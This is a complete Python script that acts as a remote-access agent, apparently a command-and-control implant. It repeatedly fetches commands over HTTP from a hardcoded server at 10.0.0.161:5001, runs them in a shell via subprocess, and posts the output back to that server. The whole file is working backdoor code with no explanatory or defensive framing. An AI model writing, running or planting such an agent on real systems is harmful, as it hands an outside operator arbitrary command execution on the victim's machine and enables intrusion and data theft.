import http.client
import json
import subprocess
import time

SERVER_HOST = "10.0.0.161"
SERVER_PORT = 5001

def get_command():
    try:
        conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
        conn.request("GET", "/get_command")
        response = conn.getresponse()
        if response.status == 200:
            return response.read().decode().strip()
    except Exception as e:
        print(f"[!] Error getting command: {SERVER_HOST}:{e}")
    return None

def send_result(result):
    try:
        conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
        headers = {"Content-type": "application/json"}
        payload = json.dumps({"result": result})
        conn.request("POST", "/post_result", body=payload, headers=headers)
        conn.getresponse()  # We don't really care about the response
    except Exception as e:
        print(f"[!] Error sending result: {e}")

def run_command(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
    except subprocess.CalledProcessError as e:
         output = e.output
    return output

def main():
    while True:
        cmd = get_command()
        if cmd and cmd.lower() != "none":
            print(f"[+] Received command: {cmd}")
            output = run_command(cmd)
            send_result(output)
        time.sleep(5)

if __name__ == "__main__":
    main()
